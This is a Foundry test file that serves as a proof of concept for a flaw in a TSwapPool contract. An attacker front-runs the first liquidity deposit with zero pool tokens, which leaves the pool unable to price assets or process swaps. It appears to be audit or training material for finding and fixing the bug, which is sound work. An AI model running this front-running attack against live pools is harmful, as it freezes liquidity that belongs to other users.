// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { TSwapPool } from "../../src/PoolFactory.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract TSwapPoolTest is Test {
    TSwapPool pool;
    ERC20Mock poolToken;
    ERC20Mock weth;

    address liquidityProvider = makeAddr("liquidityProvider");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        poolToken = new ERC20Mock();
        weth = new ERC20Mock();
        pool = new TSwapPool(address(poolToken), address(weth), "LTokenA", "LA");

        weth.mint(liquidityProvider, 200e18);
        poolToken.mint(liquidityProvider, 200e18);

        weth.mint(user, 200e18);
        poolToken.mint(user, 200e18);

        weth.mint(attacker, 200e18);
        poolToken.mint(attacker, 200e18);
    }

    function testInitialDepositZeroPoolTokens() public {
        // attacker front run the initial deposit
        vm.startPrank(attacker);
        weth.approve(address(pool), 200e18);
        poolToken.approve(address(pool), 200e18);

        // deposit zero poolTokens
        pool.deposit(1e9, 0, 0, uint64(block.timestamp));

        // initial liquidit provider is now trying to deposit
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool), 100e18);
        poolToken.approve(address(pool), 100e18);
        pool.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));

        assertEq(poolToken.balanceOf(address(pool)), 0);

        // pool is broken now, prices cannot be calculated
        vm.expectRevert();
        pool.getPriceOfOneWethInPoolTokens();

        // swap not working
        vm.expectRevert();
        pool.swapExactInput(
            weth,
            1e18,
            poolToken,
            0,
            uint64(block.timestamp)
        );
    }
}
